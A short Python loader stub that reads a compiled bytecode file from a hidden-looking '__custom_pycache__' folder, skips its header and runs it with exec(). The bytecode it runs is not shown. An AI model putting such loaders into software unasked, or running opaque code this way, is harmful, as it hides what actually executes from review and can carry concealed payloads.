
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Usersays_a80190f4813247009fba83aa011c616c.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
